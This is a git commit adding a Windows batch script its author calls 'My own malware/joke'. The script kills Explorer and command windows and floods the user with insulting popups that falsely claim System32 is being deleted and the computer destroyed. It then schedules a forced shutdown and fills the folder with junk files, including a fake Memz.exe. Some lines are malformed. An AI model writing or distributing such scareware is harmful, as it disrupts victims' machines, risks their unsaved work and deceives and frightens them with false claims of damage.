5fbf4acf6a6b03a59ba98b5846a6edfb4b73026b
Kepixbro <105105160+Kepixbro@users.noreply.github.com>
2022-05-08 10:35:35 +0200

    My own malware/joke
    This malware is not responsible for not damaging anything, I still would update this and make more malware/joke and other stuff in the future.

---
+++ Bruh.exe.bat
@@ -0,0 +1,63 @@
+@echo off 
+taskkill /f /im explorer.exe
+notepad notepad notepad notepad notepad taskkill /f /im explorer.exe taskkill /f /im explorer.exe taskkill /f /im explorer.exe taskkill /f /im explorer.exe taskkill /f /im explorer.exe 
+msg * Haha you just opened a virus Enjoy ur computer deleting system 32 :D 
+start taskkill /f /im cmd.exe start taskkill /f /im cmd.exe start taskkill /f /im cmd.exe
+msg * LOL RIP.
+msg * Ur screwed.
+msg * Deleting system32 
+msg * Ur pc is trashed.
+msg * LOL 
+msg * Ur computer is done for.
+msg * Virus had been spread on all files.
+msg * shutting down for Changes
+msg * LOL
+msg * enjoy ur last minutes of ur computer
+msg * And done use it carefully.
+msg * Still using this computer?
+msg * Byeee :D
+msg * Do you want to fix the virus?
+msg * fixing virus
+msg * 20% complete
+msg * 50% complete
+msg * Completed.
+msg * Doing final touches.
+msg * Done.
+msg * SIKKKEEEEE
+msg * YOU THOUGHT.
+msg * Goodbye.
+msg * Still using this computer?  
+shutdown -c "LOL Get rekted you idiot" -s
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Malware.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Virus.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > LOL.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Trash.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > urcomputerismine.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Trash.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > stupid.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Noescape.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > freeantivirus.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > lmao.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Getgood.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > betterlucknextime.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > xddd.txt
+echo baby shark dodododododooooo You suck. > Babyshark.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > freeviruslegit.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > RIP.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Goneforever.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Noob.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Yousuck.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > LLLLL.txt 
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > vid.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > nope.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > reee.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > Memz.exe
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > noescapeeeeeeeeee
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > pcdonefor.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > GETbetter.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > realvirus.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > noo.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > R.I.P.txt
+echo ben ben ben bben ben benbe nbebnebnjkjdlf jdsfklgjh > ben.txt
+echo Ur computer is done for U cannot get rid of this malware LOL you stupid. > urmom.txt
+get better hacks > minecrafthacks.txt
